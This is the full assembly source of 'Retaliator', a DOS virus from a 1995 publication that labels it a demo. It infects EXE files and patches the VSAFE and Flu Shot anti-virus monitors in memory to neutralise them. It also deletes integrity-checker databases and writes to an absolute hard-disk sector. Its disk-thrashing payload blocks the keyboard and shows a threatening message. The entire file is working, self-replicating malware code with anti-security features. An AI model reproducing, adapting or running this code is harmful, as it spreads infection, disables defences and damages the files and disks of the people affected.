;The Retaliator Virus retaliates against anti-virus software.

;(C) 1995 American Eagle Publications, Inc. All Rights Reserved.
;This virus is for DEMO purposes only!!

        .SEQ                       ;segments must appear in sequential order
                                   ;to simulate conditions in actual active virus

        .386                       ;this speeds the virus up a lot!

;HOSTSEG program code segment. The virus gains control before this routine and
;attaches itself to another EXE file.
HOSTSEG SEGMENT BYTE USE16
        ASSUME  CS:HOSTSEG,SS:HSTACK

;This host simply terminates and returns control to DOS.
HOST:
        mov     ax,4C00H
        int     21H             ;terminate normally
HOSTSEG ENDS

;Host program stack segment
STACKSIZE       EQU     400H           ;size of stack for this program

HSTACK  SEGMENT PARA STACK 'STACK'
        db  STACKSIZE dup (?)
HSTACK  ENDS

;************************************************************************
;This is the virus itself

NUMRELS         EQU     2              ;number of relocatables in the virus

;Intruder Virus code segment. This gains control first, before the host. As this
;ASM file is layed out, this program will look exactly like a simple program
;that was infected by the virus.

VSEG    SEGMENT PARA USE16
        ASSUME  CS:VSEG,DS:VSEG,SS:HSTACK

;Data storage area
DTA     DB      2BH dup (?)           ;new disk transfer area
EXE_HDR DB      1CH dup (?)           ;buffer for EXE file header
EXEFILE DB      '*.EXE',0             ;search string for an exe file

;The following 10 bytes must stay together because they are an image of 10
;bytes from the EXE header
HOSTS   DW      HOSTSEG,STACKSIZE     ;host stack and code segments
FILLER  DW      ?                     ;these are hard-coded 1st generation
HOSTC   DW      0,HOSTSEG             ;Use HOSTSEG for HOSTS, not HSTACK to fool A86


;Main routine starts here. This is where cs:ip will be initialized to.
VIRUS:
        pusha                   ;save startup registers
        push    cs
        pop     ds              ;set ds=cs
        mov     ah,1AH          ;set up a new DTA location
        mov     dx,OFFSET DTA   ;for viral use
        int     21H
        call    SCAN_RAM        ;scan for behavior checkers
        jnz     VIR1            ;nothing found, go on
        call    RAM_AV          ;found one - go deal with it
VIR1:   call    DEL_AV_FILES    ;delete any integrity checker files
        call    CHK_LAST_INFECT ;check integrity of last infection
        jz      VIR2            ;all ok, continue
        jmp     TRASH_DISK      ;else jump into action
VIR2:   call    FINDEXE         ;get an exe file to attack
        jc      FINISH          ;returned c - no valid file, go check integ
        call    INFECT          ;move virus code to file we found
        call    SET_LAST_INFECT ;save its name in Cyl 0, Hd 0, Sec 0
FINISH: push    es
        pop     ds              ;restore ds to PSP
        mov     dx,80H
        mov     ah,1AH          ;restore DTA to PSP:80H for host
        int     21H
        popa                    ;restore startup registers
        cli
        mov     ss,WORD PTR cs:[HOSTS]  ;set up host stack properly
        mov     sp,WORD PTR cs:[HOSTS+2]
        sti
        jmp     DWORD PTR cs:[HOSTC]   ;begin execution of host program


;This function searches the current directory for an EXE file which passes
;the test FILE_OK. This routine will return the EXE name in the DTA, with the
;file open, and the c flag reset, if it is successful. Otherwise, it will
;return with the c flag set. It will search a whole directory before giving up.
FINDEXE:
        mov     dx,OFFSET EXEFILE
        mov     cx,3FH          ;search first for any file *.EXE
        mov     ah,4EH
        int     21H
NEXTE:  jc      FEX             ;is DOS return OK? if not, quit with c set
        mov     dx,OFFSET DTA+1EH    ;set dx to point to file name
        mov     ax,3D02H               ;r/w access open file
        call    FILE_OK         ;yes - is this a good file to use?
        jnc     FEX             ;yes - valid file found - exit with c reset
        mov     ah,4FH
        int     21H             ;do find next
        jmp     SHORT NEXTE     ;and go test it for validity
FEX:    ret                     ;return with c set properly


;Function to determine whether the EXE file found by the search routine is
;useable. If so return nc, else return c
;What makes an EXE file useable?:
;              a) The signature field in the EXE header must be 'MZ'. (These
;                 are the first two bytes in the file.)
;              b) The Overlay Number field in the EXE header must be zero.
;              c) It should be a DOS EXE, without Windows or OS/2 extensions.
;              d) There must be room in the relocatable table for NUMRELS
;                 more relocatables without enlarging it.
;              e) The initial ip stored in the EXE header must be different
;                 than the viral initial ip. If they're the same, the virus
;                 is probably already in that file, so we skip it.
;
FILE_OK:
        int     21H
        jc      OK_END1                ;error opening - C set - quit without closing
        mov     bx,ax                  ;put handle into bx and leave bx alone from here on out
        mov     cx,1CH                 ;read 28 byte EXE file header
        mov     dx,OFFSET EXE_HDR      ;into this buffer
        mov     ah,3FH                 ;for examination and modification
        int     21H
        jc      OK_END                 ;error in reading the file, so quit
        cmp     WORD PTR [EXE_HDR],'ZM';check EXE signature of MZ
        jnz     OK_END                 ;close & exit if not
        cmp     WORD PTR [EXE_HDR+26],0;check overlay number
        jnz     OK_END                 ;not 0 - exit with c set
        cmp     WORD PTR [EXE_HDR+24],40H ;is rel table at offset 40H or more?
        jnc     OK_END                 ;yes, it is not a DOS EXE, so skip it
        call    REL_ROOM               ;is there room in the relocatable table?
        jc      OK_END                 ;no - exit
        cmp     WORD PTR [EXE_HDR+14H],OFFSET VIRUS  ;see if initial ip = virus initial ip
        clc
        jne     OK_END1                ;if all successful, leave file open
OK_END: mov     ah,3EH                 ;else close the file
        int     21H
        stc                            ;set carry to indicate file not ok
OK_END1:ret                            ;return with c flag set properly


;This function determines if there are at least NUMRELS openings in the
;relocatable table for the file. If there are, it returns with carry reset,
;otherwise it returns with carry set. The computation this routine does is
;to compare whether
;    ((Header Size * 4) + Number of Relocatables) * 4 - Start of Rel Table
;is >= than 4 * NUMRELS. If it is, then there is enough room
;
REL_ROOM:
        mov     ax,WORD PTR [EXE_HDR+8] ;size of header, paragraphs
        add     ax,ax
        add     ax,ax
        sub     ax,WORD PTR [EXE_HDR+6] ;number of relocatables
        add     ax,ax
        add     ax,ax
        sub     ax,WORD PTR [EXE_HDR+24] ;start of relocatable table
        cmp     ax,4*NUMRELS            ;enough room to put relocatables in?
        ret                             ;exit with carry set properly


;This routine moves the virus (this program) to the end of the EXE file
;Basically, it just copies everything here to there, and then goes and
;adjusts the EXE file header and two relocatables in the program, so that
;it will work in the new environment. It also makes sure the virus starts
;on a paragraph boundary, and adds how many bytes are necessary to do that.
INFECT:
        mov     cx,WORD PTR [DTA+1CH]   ;adjust file length to paragraph
        mov     dx,WORD PTR [DTA+1AH]   ;boundary
        or      dl,0FH
        add     dx,1
        adc     cx,0
        mov     WORD PTR [DTA+1CH],cx
        mov     WORD PTR [DTA+1AH],dx
        mov     ax,4200H                ;set file pointer, relative to beginning
        int     21H                     ;go to end of file + boundary

        mov     cx,OFFSET FINAL         ;last byte of code
        xor     dx,dx                   ;first byte of code, ds:dx
        mov     ah,40H                  ;write body of virus to file
        int     21H

        mov     dx,WORD PTR [DTA+1AH]   ;find relocatables in code
        mov     cx,WORD PTR [DTA+1CH]   ;original end of file
        add     dx,OFFSET HOSTS         ;            + offset of HOSTS
        adc     cx,0                    ;cx:dx is that number
        mov     ax,4200H                ;set file pointer to 1st relocatable
        int     21H
        mov     dx,OFFSET EXE_HDR+14    ;get correct host ss:sp, cs:ip
        mov     cx,10
        mov     ah,40H                  ;and write it to HOSTS/HOSTC
        int     21H

        xor     cx,cx                   ;so now adjust the EXE header values
        xor     dx,dx
        mov     ax,4200H                ;set file pointer to start of file
        int     21H

        mov     ax,WORD PTR [DTA+1AH]   ;calculate viral initial CS
        mov     dx,WORD PTR [DTA+1CH]   ; = File size / 16 - Header Size(Para)
        mov     cx,16
        div     cx                      ;dx:ax contains file size / 16
        sub     ax,WORD PTR [EXE_HDR+8] ;subtract exe header size, in paragraphs
        mov     WORD PTR [EXE_HDR+22],ax;save as initial CS
        mov     WORD PTR [EXE_HDR+14],ax;save as initial SS
        mov     WORD PTR [EXE_HDR+20],OFFSET VIRUS  ;save initial ip
        mov     WORD PTR [EXE_HDR+16],OFFSET FINAL + STACKSIZE  ;save initial sp

        mov     dx,WORD PTR [DTA+1CH]   ;calculate new file size for header
        mov     ax,WORD PTR [DTA+1AH]   ;get original size
        add     ax,OFFSET FINAL + 200H  ;add virus size + 1 paragraph, 512 bytes
        adc     dx,0
        mov     cx,200H                 ;divide by paragraph size
        div     cx                      ;ax=paragraphs, dx=last paragraph size
        mov     WORD PTR [EXE_HDR+4],ax ;and save paragraphs here
        mov     WORD PTR [EXE_HDR+2],dx ;last paragraph size here
        add     WORD PTR [EXE_HDR+6],NUMRELS    ;adjust relocatables counter
        mov     cx,1CH                  ;and save 1CH bytes of header
        mov     dx,OFFSET EXE_HDR       ;at start of file
        mov     ah,40H
        int     21H
                                        ;now modify relocatables table
        mov     ax,WORD PTR [EXE_HDR+6] ;get number of relocatables in table
        dec     ax                      ;in order to calculate location of
        dec     ax                      ;where to add relocatables
        mov     cx,4                    ;Location= (No in table-2)*4+Table Offset
        mul     cx
        add     ax,WORD PTR [EXE_HDR+24];table offset
        adc     dx,0
        mov     cx,dx
        mov     dx,ax
        mov     ax,4200H                ;set file pointer to table end
        int     21H

        mov     WORD PTR [EXE_HDR],OFFSET HOSTS    ;use EXE_HDR as buffer
        mov     ax,WORD PTR [EXE_HDR+22]           ;and set up 2 pointers to file
        mov     WORD PTR [EXE_HDR+2],ax            ;1st points to ss in HOSTS
        mov     WORD PTR [EXE_HDR+4],OFFSET HOSTC+2
        mov     WORD PTR [EXE_HDR+6],ax            ;second to cs in HOSTC
        mov     cx,8                    ;ok, write 8 bytes of data
        mov     dx,OFFSET EXE_HDR
        mov     ah,40H                  ;DOS write function
        int     21H
        mov     ah,3EH                  ;close file now
        int     21H
        ret                             ;that's it, infection is complete!

;**************************************************************************
;This routine scans the RAM for anti-viral programs. The scan strings are
;set up below. It allows multiple scan strings of varying length. They must
;be located at a specific offset with respect to a segment, which is detailed
;in the scan string data record. This routine scans all of memory, from
;the top of the interrupt vector table to the bottom of the BIOS ROM at F000.
;As such it can scan for programs in low or high memory, which is important
;with DOS 5's ability to load high. This returns with Z set if a scan match
;is found

SCAN_RAM:
        push    es
        mov     si,OFFSET SCAN_STRINGS
SRLP1:  lodsb                           ;get a byte (string size)
        or      al,al
        jz      SREXNZ
        mov     cl,al
        xor     ch,ch                   ;cx=size of string
        xor     ax,ax
        mov     es,ax
        lodsw
        mov     di,ax                   ;di=offset of string
        add     si,6                    ;si=scan string here
SRLP2:  push    cx
        push    di
        push    si
SRLP3:  lodsb
        dec     al
        inc     di
        cmp     al,es:[di-1]
        loopz   SRLP3
        pop     si
        pop     di
        pop     cx
        jz      SREXZ
        mov     ax,es
        inc     ax
        mov     es,ax
        cmp     ax,0F000H
        jnz     SRLP2
        add     si,cx
        jmp     SRLP1

SREXZ:                          ;match found, set up registers
        add     sp,2            ;get es off of stack
        sub     si,8            ;back up to offset of start of av INT 21H @
        lodsw                   ;get it
        mov     di,ax           ;and put it here
        lodsw                   ;get old int 21H address location
        mov     dx,ax           ;save it here
        lodsw                   ;get av INT 13H @
        mov     cx,ax           ;save here
        lodsw                   ;and old int 13H address location
        mov     si,ax           ;put that here
        xor     al,al           ;set z and exit
        ret

SREXNZ:
        pop     es
        mov     al,1            ;return with nz - no matches of any strings
        or      al,al
        ret


;The scan string data structure looks like this:
;       DB      LENGTH      = A single byte string length
;       DW      OFFSET      = Offset of av's INT 21H handler
;       DW      OFFSET      = Offset where original INT 21H vector is located
;       DW      OFFSET      = Offset of av's INT 13H handler
;       DW      OFFSET      = Offset where original INT 13H vector is located
;       DB      X,X,X...    = LENGTH bytes of av's INT 21H handler
;                             (add 1 to actual bytes to get string)
;
;These are used back to back, and when a string of length 0 is encountered,
;SCAN_RAM stops.
SCAN_STRINGS:
        DB      16                              ;length of scan string
        DW      0945H                           ;offset of scan string
        DW      0DC3H                           ;offset of INT 21H vector
        DW      352H                            ;av INT 13H handler
        DW      0DB3H                           ;offset of old INT 13H vector
        DB      0FCH,81H,0FDH,0FBH,76H,4,0EAH   ;16 byte scan string
        DB      19H,0FBH,51H,0B1H,000H,2FH,87H  ;for Microsoft VSAFE, v1.0
        DB      7,72H

        DB      16                              ;length of scan string
        DW      2B9DH                           ;offset of scan string
        DW      19B9H                           ;offset of INT 21H vector
        DW      27AEH                           ;offset of av INT 13H
        DW      19C9H                           ;offset of INT 13H vector
        DB      9DH,0FCH,3EH,10H,0,76H,6        ;16 byte scan string
        DB      0B9H,2,2,9EH,0D0H,0E9H,75H      ;for Flu Shot + v1.84
        DB      0FFH,74H

        DB      0                               ;next record, no more strings

;This routine handles defusing the RAM resident anti-virus. On entry, si
;points to old INT 21H offset, di points to start of INT 21H hook, and
;es points to segment to find it in.
RAM_AV:
        in      al,40H                          ;get rand # from usec timer
        and     al,0FH                          ;1 in 16 chance
        jz      TRASH_DISK                      ;yes-display trash disk msg
        mov     ax,0FF2EH                       ;set up jmp far cs:[OLD21]
        stosw                                   ;in av's INT 21H handler
        mov     al,2EH
        stosb
        mov     ax,dx
        stosw
        mov     di,cx                           ;now do the same for INT 13H
        mov     ax,0FF2EH
        stosw
        mov     al,2EH
        stosb
        mov     ax,si
        stosw
        ret

;**************************************************************************
;This routine trashes the hard disk in the event that anti-viral measures are
;detected.

;This is JUST A DEMO. NO DAMAGE WILL BE DONE. It only READS the disk real fast.

INT9:
        in      al,60H                          ;get keystroke & dump it
        mov     al,20H                          ;reset 8259
        out     20H,al
        iret

TRASH_DISK:
        mov     dx,OFFSET TRASH_MSG             ;display a nasty message
        mov     ah,9
        int     21H
        mov     ax,2509H                        ;grab interrupt 9
        mov     dx,OFFSET INT9                  ;so ctrl-alt-del won't work
        int     21H
        mov     si,0
TSL:    lodsb                                   ;get a random byte for
        mov     ah,al                           ;cylinder to read
        lodsb
        and     al,3
        mov     dl,80H
        mov     dh,al
        mov     ch,ah
        mov     cl,1
        mov     bx,OFFSET FINAL                 ;buffer to read into
        mov     ax,201H
        int     13H
        jmp     SHORT TSL                       ;loop forever

TRASH_MSG       DB 0DH,0AH,7,'Retaliator has detected ANTI-VIRUS '
                DB 'software. TRASHING HARD DISK!',0DH,0AH,24H


;This routine deletes files created by integrity checkers in the current
;directory. An attempt is made to delete all the files listed in DEL_FILES.
DEL_AV_FILES:
        mov     si,OFFSET DEL_FILES
DAF1:   mov     ax,[si]         ;get a byte
        or      al,al           ;zero?
        jz      DAFX            ;yes, all done
        mov     dx,si
        mov     ax,4301H        ;DOS change attribute function
        xor     cl,cl           ;not hidden, not read-only, not system
        int     21H
        jc      DAF2
        mov     dx,si
        mov     ah,41H          ;DOS delete function
        int     21H
DAF2:   lodsb                   ;update si
        or      al,al
        jnz     DAF2
        jmp     DAF1

DAFX:   ret

DEL_FILES       DB      'CHKLIST.MS',0
                DB      'CHKLIST.CPS',0
                DB      'ZZ##.IM',0
                DB      'ANTI-VIR.DAT',0
                DB      0                       ;end of list marker


;**************************************************************************
;This routine checks the last infected file, whose name is stored at Cyl 0,
;Head 0, Sector 2 as an asciiz string. If the name isn't there, the file is
;infected, or missing, this routine returns with Z set. If the file does
;not appear to be infected, it returns NZ. The ID CHECK_SEC_ID is the first
;two bytes in the sector. The sector is only assumed to contain a file name
;if the ID is there. The ASCIIZ string starts at offset 2.

CHECK_SEC_ID    EQU     0FC97H

CHK_LAST_INFECT:
        push    es
        push    cs
        pop     es
        mov     ax,0201H                        ;read the hard disk absolute
        mov     cx,2                            ;sector Cyl 0, Hd 0, Sec 2
        mov     dx,80H                          ;drive C:
        mov     bx,OFFSET CIMAGE                ;buffer for read
        int     13H
        pop     es
        mov     bx,OFFSET CIMAGE
        cmp     WORD PTR [bx],CHECK_SEC_ID      ;check first word for sector ID
        jnz     CLI_ZEX                         ;sector not there yet, pass OK back
        mov     dx,OFFSET CIMAGE+2              ;location of file name
        mov     ax,3D00H                        ;read only open doesn't trigger av
        call    FILE_OK                         ;check file out
        jc      CLI_ZEX                         ;infected or error opening, OK
        mov     al,1                            ;else file not infected
        or      al,al                           ;return NZ!
        ret

CLI_ZEX:
        xor     al,al                           ;set Z and exit
        ret


;This routine writes the last infect file name to Cylider 0, Head 0, Sector 2,
;for later checking to see if the file is still infected. That file name is
;composed of the current path (since this virus does not jump directories) and
;the file name at DTA+1EH
SET_LAST_INFECT:
        push    es
        push    cs
        pop     es
        mov     WORD PTR [CIMAGE],CHECK_SEC_ID  ;sector ID into sector
        mov     BYTE PTR [CIMAGE+2],'\'         ;put starting '\' in
        mov     ah,47H                          ;get current directory
        mov     dl,0
        mov     si,OFFSET CIMAGE+3              ;put it here
        int     21H
        mov     di,OFFSET CIMAGE+3
SLI1:   cmp     BYTE PTR [di],0
        jz      SLI2
        inc     di
        jmp     SLI1
SLI2:   cmp     di,OFFSET CIMAGE+3              ;no double \\ for root dir
        jz      SLI3
        mov     BYTE PTR [di],'\'               ;put ending '\' in
        inc     di
SLI3:   mov     si,OFFSET DTA+1EH               ;put in file name of last
SLI4:   lodsb                                   ;infected file
        stosb
        or      al,al
        jnz     SLI4                            ;loop until done
        mov     ax,0301H                        ;write to hard disk absolute
        mov     cx,2                            ;sector Cyl 0, Hd 0, Sec 2
        mov     dx,80H                          ;drive C:
        mov     bx,OFFSET CIMAGE
        int     13H
        pop     es
        ret                                     ;all done

FINAL:                                  ;label for end of virus

CIMAGE  DB      512 dup (09DH)             ;place to put Cyl 0, Hd 0, Sec 2 data

VSEG    ENDS

        END VIRUS               ;Entry point is the virus
